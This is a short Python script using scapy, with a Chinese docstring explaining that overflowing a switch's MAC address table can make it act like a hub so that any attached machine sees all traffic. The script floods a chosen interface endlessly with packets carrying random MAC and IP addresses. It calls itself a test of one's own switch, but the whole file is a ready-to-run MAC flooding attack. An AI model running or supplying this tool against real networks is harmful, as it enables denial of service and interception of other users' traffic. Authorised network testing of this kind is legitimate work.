#!/usr/bin/env python
# coding: utf-8

"""
路由器和交换机的内存都是有限的，于是用来保存MAC地址的表和ARP缓存的大小也是有限的。
有些交换机在他们内存溢出的时候会表现怪异。
有时候会造成dos从而让交换机退化成集线器（HUB），集线器会放大信号。
于是连载上面的任何计算机都能看到完整的网络

这段代码是为了测试你的交换机而生的，随机生产一些MAC地址，造成缓冲区满
"""

import sys
from scapy.all import *

packet = Ether(src=RandMAC("*:*:*:*:*:*"), dst=RandMAC("*:*:*:*:*:*")) / \
        IP(src=RandIP("*.*.*.*"), dst=RandIP("*.*.*.*")) / \
        ICMP()

if len(sys.argv) < 2:
    dev = "eth0"
else:
    dev = sys.argv[1]

print "Flooding net with random packets on dev " + dev

sendp(packet, iface=dev, loop=1)

